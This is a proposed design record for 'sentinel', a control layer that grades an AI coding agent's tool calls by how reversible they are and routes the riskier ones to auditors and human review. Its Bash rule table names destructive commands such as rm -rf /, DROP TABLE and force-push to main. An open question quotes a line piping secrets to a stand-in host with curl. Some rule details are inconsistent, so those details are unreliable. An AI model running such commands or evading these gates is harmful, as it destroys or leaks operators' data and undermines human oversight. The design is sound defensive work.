# A6 — Reversibility-Graded Tripwires

**Status:** Proposed (pending Gary's ratification)
**Author:** Jared (drafted with Claude Opus 4.7)
**Date:** 2026-05-16
**Source brief:** `docs/ai-factory-brief.md` — recommendation **A6** (A-tier; paired with R3 retirement)
**Related:**
- `docs/policy-no-novelty-primary-tripwires.md` (R3) — A6 is the replacement for the retired novelty-primary axis
- `docs/a3-dry-run-then-commit.md` (A3) — A3's trigger uses A6's classification; the design of `reversibility::classify` in A3 §4.2 is the minimum-viable form completed here
- `docs/hook-quality-improvements.md` Issue 2 — the path-based trivial-write exemption list is the minimum-viable bridge to A6
- `docs/ba5-adversarial-deck-critique.md` — uses A6 classification for BA artifact-class (Routine / Substantial / Catastrophic in BA5 §2 maps onto reversibility class)
- `docs/ba1-ba3-sentinel-enforcement.md` — `provenance_validate` and `requirements_traceability_gate` use A6's class for stricter freshness windows on Catastrophic
- Memory: `architecture-hexagonal-ddd`

---

## TL;DR

A6 introduces a **`ReversibilityClass`** enum and a per-tool **classification scheme** that becomes the substrate axis for every blast-radius gate in sentinel. Replaces the novelty-primary tripwire pattern that R3 retired. The four classes are:

- **TriviallyReversible** — undoable in seconds, no human attention needed. (File save under VCS, transient session state, memory notes.)
- **ReversibleWithEffort** — undoable with a known recovery procedure. (Force-push, schema migration with rollback, configuration file edits.)
- **Irreversible** — practically undoable. (Production deploy, sent email, public release, posted PR.)
- **Catastrophic** — irreversible *and* high-blast-radius. (Production DB drop, account deletion, financial transaction, exec-deck delivery in the BA-vertical.)

Tools are classified through a layered scheme: built-in defaults shipped with sentinel, operator overrides in `config/reversibility.toml`, and per-input contextual rules (e.g., `Bash` is class-by-pattern rather than tool-uniform). The classification is read by every consuming gate: `tool_usage_gate` (granularity), `dry_run_then_commit` (trigger), `ba_critique` (artifact-class), `provenance_validate` (freshness window), `requirements_traceability_gate` (strict matrix check), and any future safety primitive (A4 debate routing, A7 canary trigger criteria, A8 interpretability sampling rate).

The cost of compliance is the one-time classification work per tool in the registry. The benefit is that *every* blast-radius gate in sentinel uses the same axis — calibration improvements compound across hooks.

---

## 1. The architectural problem

Before A6, every sentinel gate makes its own ad-hoc judgment about "is this action risky enough to gate?" The `tool_usage_gate` treats every `Edit`/`Write` uniformly (hook-quality Issue 2). The `git_hygiene` hook treats `git push --force` differently from `git push`. The `commit_message_validator` doesn't differentiate by what's being committed. Each hook has its own implicit risk model.

The result:

- **Uniform over-gating** at the file-mutation layer (memory notes pay the same gate latency as source code edits).
- **Inconsistent thresholds across hooks** — what one hook considers high-risk, another may pass silently.
- **No single dial to tune** — when sentinel feels too aggressive in one area or too permissive in another, there's no shared concept to adjust.
- **No place for A3's trigger logic** — A3 needs to know "is this action irreversible?"; without a shared classifier, A3 has to roll its own, duplicating work.

A6 introduces a single axis — reversibility — that every gate can consult. The axis is grounded in Bostrom-class reasoning (which is the framing that survives Goodhart, per R3): we care about whether a mistake can be undone, not whether the action is unusual.

---

## 2. The four classes

### TriviallyReversible

**Properties:**
- The action is undoable in seconds.
- No human attention is required to recover.
- The action does not change any state visible outside the immediate session.

**Examples:**
- File save under VCS in a clean working tree.
- Writing to `~/.claude/projects/` (Claude Code session metadata).
- Writing to `~/.claude/plans/` (Claude Code plan files).
- Writing to `~/.claude/sentinel/state/` (sentinel session state).
- Writing to `~/.claude/sentinel/metrics/` (sentinel metrics JSONL).
- Reading any source (file, MCP, API).
- Read-only MCP calls (`mcp__linear__list_issues`, `mcp__confluence__get_page`).
- Bash commands that don't mutate (`ls`, `cat`, `grep`, `find`, `git status`, `git log`).

**Gate behavior:** No blast-radius gating. May still be subject to other gates (e.g., authentication) but the reversibility-graded layer is silent.

### ReversibleWithEffort

**Properties:**
- The action is undoable with a known recovery procedure.
- Recovery may require operator attention but is mechanical.
- State changes are visible inside the local workspace but not outside the operator's control surface.

**Examples:**
- Source-code Edit/Write inside a worktree (recovery: git reset / git checkout).
- Schema migrations with explicit rollback procedures.
- Configuration file edits.
- `git commit` (recovery: git reset, git revert).
- `git push --force-with-lease` (recovery: reflog + force push prior commit; effort but mechanical).
- Mutating MCP calls scoped to operator-owned resources (`mcp__linear__update_issue`).

**Gate behavior:** Standard gate stack applies (`tool_usage_gate` checks task + plan-mode + sequential-thinking marker). No dry-run-then-commit auditor required. No human spot-check sampling.

### Irreversible

**Properties:**
- The action is practically undoable.
- Recovery requires substantial operator effort, may require third-party intervention, or may not be possible at all.
- State changes are visible outside the operator's local control surface — published to a system of record, delivered to a recipient, persisted in shared infrastructure.

**Examples:**
- `git push` to a shared branch (the commit is now in shared history; recovery requires force-push, which is itself disruptive).
- Production deploys.
- Sending email (`mcp__gmail__send`).
- Posting GitHub PRs (`mcp__gh__pr_create`).
- Posting Slack messages (`mcp__slack__post_message`).
- BA-vertical: publishing a Substantial-class output (brief, recommendation).
- Creating a Linear issue (revocable but takes effort and leaves audit trail).
- `terraform apply` on non-production environments.

**Gate behavior:** **A3 (dry-run-then-commit) fires.** Auditor scores the dry-run. Human-sample escalation at configured rate. Block on auditor fail.

### Catastrophic

**Properties:**
- The action is irreversible AND has high blast radius.
- A mistake produces persistent harm at scale.
- Recovery may be impossible; the harm itself may be uncountable in advance.

**Examples:**
- Production database mutations (`DROP TABLE`, `DELETE FROM` without `WHERE`).
- Account deletion (own or others').
- Financial transactions (`mcp__stripe__charge`, treasury moves).
- `terraform destroy` on production.
- `git push --force` to `main`/`master`/protected branches.
- Customer-facing communication at scale (mailing list, social media).
- BA-vertical: publishing a Catastrophic-class output (exec deck, board materials, customer-facing recommendation).
- Anything that touches PII, secrets, or regulated data without explicit authorization.

**Gate behavior:** **A3 fires AND human is always sampled regardless of auditor result.** Two-eyes rule per BA5 for BA outputs. Dual-auditor (proto-A4) for non-BA contexts. Block on any auditor fail. Block-pending-human-acknowledgment for any operator-override path. The strictest gate sentinel applies.

---

## 3. Classification scheme

Tools and tool calls are classified through a four-layer scheme, evaluated in order:

### Layer 1 — Built-in tool defaults

Sentinel ships with a default classification for every well-known tool (Edit, Write, Read, Glob, Grep, Bash, Task, TaskUpdate, etc.) and a default-class for unknown MCP tools (conservatively Irreversible).

```rust
match tool_name {
    "Read" | "Glob" | "Grep" | "TaskList" => TriviallyReversible,
    "Edit" | "Write" | "TaskCreate" | "TaskUpdate" => ReversibleWithEffort,
    "Bash" => /* delegate to Layer 3 — input-dependent */,
    "WebFetch" | "WebSearch" => TriviallyReversible,  // pure observation
    t if t.starts_with("mcp__") => /* delegate to Layer 2 — MCP-specific */,
    _ => Irreversible,  // conservative default for unknown
}
```

### Layer 2 — Per-MCP-tool defaults

Each MCP tool (`mcp__<server>__<tool>`) has its own classification. Defaults shipped per known MCP server:

```toml
# config/reversibility-defaults.toml (shipped with sentinel)

[mcp.linear]
list_issues = "TriviallyReversible"
get_issue = "TriviallyReversible"
create_issue = "ReversibleWithEffort"  # revocable with effort
update_issue = "ReversibleWithEffort"
delete_issue = "Irreversible"  # rarely undone

[mcp.confluence]
get_page = "TriviallyReversible"
search = "TriviallyReversible"
create_page = "Irreversible"  # published; visible to others
update_page = "Irreversible"
delete_page = "Irreversible"

[mcp.gmail]
list_messages = "TriviallyReversible"
get_message = "TriviallyReversible"
send_message = "Catastrophic"  # cannot be unsent

[mcp.slack]
list_channels = "TriviallyReversible"
get_history = "TriviallyReversible"
post_message = "Irreversible"  # visible immediately; can be edited but not unseen
```

Unknown MCP tools (server registered but tool not in defaults) classify as Irreversible until explicitly downgraded.

### Layer 3 — Per-input contextual rules

Some tools (notably `Bash`) classify by input pattern rather than by tool name alone. The contextual rules live in `config/reversibility.toml`:

```toml
[bash.patterns]
# Catastrophic — substring or regex match on the command string
"rm -rf /" = "Catastrophic"
"^rm -rf [^.]" = "Catastrophic"  # rm -rf of anything not starting with .
"DROP DATABASE" = "Catastrophic"
"DROP TABLE" = "Catastrophic"
"git push --force.*main" = "Catastrophic"  # force-push to main
"git push --force.*master" = "Catastrophic"
"terraform destroy.*prod" = "Catastrophic"
"kubectl delete.*prod" = "Catastrophic"

# Irreversible
"git push" = "Irreversible"  # plain push (downgraded from Catastrophic by --force-with-lease pattern)
"git push --force-with-lease" = "ReversibleWithEffort"  # safer flag
"^terraform apply" = "Irreversible"
"^npm publish" = "Irreversible"
"^cargo publish" = "Irreversible"

# Reversible with effort
"^git commit" = "ReversibleWithEffort"
"^git reset" = "ReversibleWithEffort"  # has reflog
"^git checkout" = "ReversibleWithEffort"

# Trivially reversible
"^(ls|cat|grep|find|git status|git log|git diff)" = "TriviallyReversible"
```

Patterns are matched in order; first match wins. When no pattern matches, the default for `Bash` is ReversibleWithEffort (conservative — assume any unrecognized command is mutating).

### Layer 4 — Operator overrides

The operator can override any classification per-tool or per-input via `config/reversibility.toml`:

```toml
[overrides]
# Operator-specified: this MCP tool is actually trivially reversible in their environment
"mcp__custom__list_things" = "TriviallyReversible"

# Operator-specified: this BA-orchestrator tool always produces catastrophic-class output
"mcp__ba_orchestrator__publish_exec_deck" = "Catastrophic"
```

Overrides override defaults but never *below* the default (you can't downgrade Catastrophic to Trivial without an explicit `--accept-classification-downgrade` flag).

---

## 4. Reading the classification — `ReversibilityClassifierPort`

```rust
// In sentinel-domain/src/ports/reversibility.rs (new port)
pub trait ReversibilityClassifierPort {
    fn classify(&self, tool_name: &str, tool_input: &serde_json::Value) -> ReversibilityClass;
}

// In sentinel-domain/src/reversibility.rs (new value-object module)
#[derive(Clone, Copy, Debug, PartialEq, Eq, PartialOrd, Ord, Hash, Serialize, Deserialize)]
pub enum ReversibilityClass {
    TriviallyReversible,
    ReversibleWithEffort,
    Irreversible,
    Catastrophic,
}

impl ReversibilityClass {
    pub fn at_least(self, other: Self) -> bool { self >= other }
}
```

The `PartialOrd` derivation makes "at least Irreversible" comparisons trivial:

```rust
if classifier.classify(tool, input).at_least(ReversibilityClass::Irreversible) {
    // gate
}
```

### Adapter

`sentinel-infrastructure/src/reversibility/`:
- Reads `config/reversibility-defaults.toml` (shipped with sentinel).
- Reads `config/reversibility.toml` (operator overrides + Bash patterns).
- Layers them in the order described above.
- Caches the compiled classification table (rebuild on config change via `ConfigChange` hook).

---

## 5. How consuming hooks use the classification

### `tool_usage_gate` (existing, extended)

Replaces the current binary `in_scope: true/false` logic:

```rust
let class = classifier.classify(tool, &input.tool_input);
match class {
    ReversibilityClass::TriviallyReversible => return HookOutput::allow(),
    ReversibilityClass::ReversibleWithEffort => {
        // Current four-check stack applies
    }
    ReversibilityClass::Irreversible | ReversibilityClass::Catastrophic => {
        // Defer to dry_run_then_commit — A3 handles it
        return HookOutput::allow();  // tool_usage_gate passes; A3 fires next
    }
}
```

This **resolves hook-quality Issue 2** (granularity) properly. The trivial-write exemption list is replaced by the broader trivial-reversibility class. Memory writes, plan files, sentinel state writes all classify as Trivial → silent.

### `dry_run_then_commit` (A3 — new)

Trigger condition becomes a one-liner:

```rust
let class = classifier.classify(tool, &input.tool_input);
if !class.at_least(ReversibilityClass::Irreversible) {
    return HookOutput::allow();  // not in A3 scope
}
// ... rest of A3 dry-run flow
```

A3's reversibility::classify helper (per A3 §4.2) is **replaced** by the shared classifier. The A3 doc's inline definition becomes the bridge; the full classifier lives here.

### `ba_critique` (BA5 — new)

BA artifact class derivation:

```rust
let publish_class = classifier.classify(tool, &input.tool_input);
let artifact_class = match publish_class {
    ReversibilityClass::TriviallyReversible | ReversibilityClass::ReversibleWithEffort => BaArtifactClass::Routine,
    ReversibilityClass::Irreversible => BaArtifactClass::Substantial,
    ReversibilityClass::Catastrophic => BaArtifactClass::Catastrophic,
};
```

The `BaArtifactClass` is a presentation-layer concept (per BA5 §2), but its *derivation* is the reversibility class. Operators don't have to classify both axes — they classify the underlying tool, and BA5 derives the artifact class.

### `provenance_validate` (BA1/BA3 enforcement)

Freshness-window tightening for Catastrophic:

```rust
let freshness_window = match class {
    ReversibilityClass::Catastrophic => Duration::from_secs(60 * 60),  // 1h
    _ => Duration::from_secs(24 * 60 * 60),  // 24h default
};
```

### `requirements_traceability_gate` (BA1/BA3 enforcement)

Coverage strictness:

```rust
let coverage_required = class.at_least(ReversibilityClass::Irreversible);
// Trivially-reversible and reversible-with-effort outputs may omit RequirementRefs;
// irreversible+ outputs must have at least one
```

### `git_hygiene` (existing — could be extended)

Future: the existing `git_hygiene` hook can consult the classifier for git operations rather than maintaining its own pattern list. Out of scope for this ADR; flagged as a cleanup opportunity.

---

## 6. The override mechanism

Every reversibility-gated action has an operator override path. The mechanism is the existing `hygiene_override` hook (signed token, 60s TTL, audited). What changes with A6:

- The override is **per-class-jump**, not per-action. An override for "act despite Irreversible classification" is one thing; "act despite Catastrophic" is another — they require separate explicit confirmation.
- Catastrophic overrides require **explicit reason** logged with the override token; sentinel-cli's `sentinel break` command prompts for it interactively.
- Override frequency is **tracked per-classification**. Sentinel emits a health warning if overrides on Catastrophic exceed a threshold (default: more than 3 per week per session) — high override rates on the strictest class are a signal the classifier is calibrated wrong or the operator is in an unsafe pattern.

---

## 7. Why reversibility survives Goodhart

The R3 retirement policy lays this out (don't repeat); short version:

- **Novelty** is the signal of useful exploration. Suppressing novelty suppresses capability. False positives dominate.
- **Reversibility** is grounded in the *consequence* of a mistake, not the *unfamiliarity* of an action. A familiar action with catastrophic consequences gates harder than an unfamiliar one with trivial consequences. This matches the actual cost model.
- Goodhart pressure on a novelty signal teaches agents to route around it. Goodhart pressure on reversibility... teaches agents to prefer reversible paths to irreversible ones. That's the desired outcome, not the failure mode.

The reversibility axis is **monotone in the right direction under selection pressure**. Novelty is monotone in the wrong direction.

---

## 8. Hex / DDD layering

- **`sentinel-domain/src/reversibility.rs`** (new module): `ReversibilityClass` enum with derived `PartialOrd`; pure value object.
- **`sentinel-domain/src/ports/reversibility.rs`** (new port): `ReversibilityClassifierPort` trait. Pure trait; no IO.
- **`sentinel-infrastructure/src/reversibility/`** (new adapter dir):
  - `classifier.rs` — the four-layer evaluator.
  - `config.rs` — TOML parser for `reversibility-defaults.toml` + `reversibility.toml`.
  - `cache.rs` — compiled classification table; rebuilt on ConfigChange.
- **`config/reversibility-defaults.toml`** (shipped with sentinel): built-in tool defaults + per-MCP-tool defaults.
- **`config/reversibility.toml`** (operator-managed): Bash pattern table + overrides.

All consuming hooks accept `&dyn ReversibilityClassifierPort` as a constructor parameter. In-memory adapter for tests.

---

## 9. Failure modes

### 9.1 Mis-classified tool blocks legitimate work

Mitigations: operator override (`hygiene_override`); operator can edit `config/reversibility.toml` to add a per-tool override; track override frequency to detect chronic mis-classification.

### 9.2 Mis-classified tool *under*-gates dangerous work

Mitigation: the conservative default for unknown MCP tools is Irreversible (not Trivially). Catastrophic patterns can only be downgraded with explicit `--accept-classification-downgrade` flag. The system fails *toward* safety.

### 9.3 Classification table grows unbounded

The defaults shipped with sentinel cover ~50 well-known tools / MCP servers. Operator overrides extend per workflow. Even at 1000 tools, the table is trivially in-memory. Not a real concern.

### 9.4 Config reload races

`ConfigChange` hook triggers reclassification. If a tool call fires during reload, it gets the cached classification (pre-reload). Mitigation: classifier reloads are atomic — old table is fully replaced; no half-states observable to callers.

### 9.5 Pattern matching is slow

Bash pattern matching could be slow for long pattern tables. Mitigation: pre-compile patterns at config load; cache compiled regex set; O(N) match where N is small (50-100 patterns typical).

### 9.6 Per-input rules differ from tool defaults — operator confusion

If `Bash` defaults to ReversibleWithEffort but a specific pattern matches Catastrophic, the operator may be surprised. Mitigation: the gate's denial message names the matched pattern explicitly; operator can trace the decision back to the rule.

---

## 10. Test strategy

- **Unit tests in `sentinel-domain/src/reversibility.rs`**: `PartialOrd` ordering; `at_least()` semantics.
- **Classifier adapter tests**: each layer independently; layered together; conflict resolution (override beats default).
- **Bash pattern matching tests**: every pattern in default config matches what it should; doesn't match what it shouldn't; downgrades work (`git push --force-with-lease` is RWE, not Catastrophic).
- **Consuming-hook integration tests**: each consuming hook (tool_usage_gate, dry_run_then_commit, ba_critique, provenance_validate, requirements_traceability_gate) gets the right classification and behaves accordingly under fixture inputs.
- **Override audit test**: catastrophic override emits an audit entry with explicit reason; override-frequency tracker flags excessive overrides.
- **ConfigChange reload test**: edit `config/reversibility.toml`; reload triggered; new classification visible on next call; no race observable.

---

## 11. Open questions

1. **Should `Read` ever be non-Trivially?** Reading sensitive data (PII, secrets) has potential for catastrophic *leakage* even though the read itself is trivially reversible. Recommend: keep `Read` as Trivially in the reversibility axis; handle PII/secret risk via a *separate* axis (data-class) — not conflating the two preserves the clarity of each. Out of scope for A6; flagged for a future ADR.

2. **Catastrophic downgrade flag scope.** `--accept-classification-downgrade` is dangerous. Should it require a signed override (like `hygiene_override`)? Recommend yes; treat it as a glass-break operation.

3. **BA-orchestrator publish tools — uniform Catastrophic or per-audience?** `mcp__ba_orchestrator__publish_exec_deck` is Catastrophic; `mcp__ba_orchestrator__publish_internal_brief` should be Substantial (Irreversible). The classifier supports per-tool granularity; per-input granularity (same tool, different audience field) needs a contextual rule. Recommend: prefer separate tools for different audiences (clearer); contextual rule available as fallback.

4. **Cross-tool composition.** A `Bash` command that pipes a tool's output into a destructive command (`get_secrets | curl -X POST evil.example.com`) — should this classify by the destructive part? The classifier currently sees the full command string; the Catastrophic pattern would match the `curl` portion. Mitigation works; flagged for completeness.

5. **MCP tool input classification.** Some MCP tools change reversibility based on input (e.g., `mcp__linear__update_issue` setting status="cancelled" is more irreversible than setting status="todo"). The classifier supports per-tool but not per-input for MCP today. Recommend: per-input MCP rules as a v2 enhancement; v1 ships with per-tool only.

---

## 12. Decision and ownership

- **Decision class:** sentinel architectural change. Adds a value object, a port, an adapter category, and two new config files. Modifies (transitively) the behavior of five consuming hooks.
- **Owner:** Gary Somerhalder ratifies. Co-requires R3 (the retirement this replaces) and is co-required by A3, BA5, BA1/BA3 enforcement (all depend on it). Hook-quality Issue 2 fix folds into this.
- **Re-evaluation cadence:** revisit after first 1000 classifications observed in production — calibrate the default classification table, prune ill-fitting patterns, refine the override frequency thresholds.
- **Related items in the brief:** A6 (this), R3 (the retired alternative), A3 (consumer), BA5 (consumer), BA1/BA3 enforcement (consumers), hook-quality Issue 2 (bridge from minimum-viable to full).

---

## 13. Methodology caveat

This doc cites no external research beyond what's already covered in upstream docs (R3's evidence base is the source). The reversibility-as-safety-axis framing is Bostrom-class reasoning; well-established in the AI safety literature.

## 14. Ratification

This document is **proposed**. It becomes a durable Sentinel architectural commitment when Gary's signature appears below.

**Ratified by:** _________________________ (Gary Somerhalder)
**Date:** _________________________

Ratification commits Sentinel to:
- Building the `ReversibilityClassifierPort` + adapter.
- Shipping `config/reversibility-defaults.toml` with the documented built-in defaults.
- Refactoring `tool_usage_gate`, `dry_run_then_commit`, `ba_critique`, `provenance_validate`, `requirements_traceability_gate` to consume the classifier.
- The override mechanism + frequency tracking.
- Treating R3, A3, BA5, BA1/BA3 enforcement, hook-quality Issue 2 as the surrounding context that makes A6 useful.
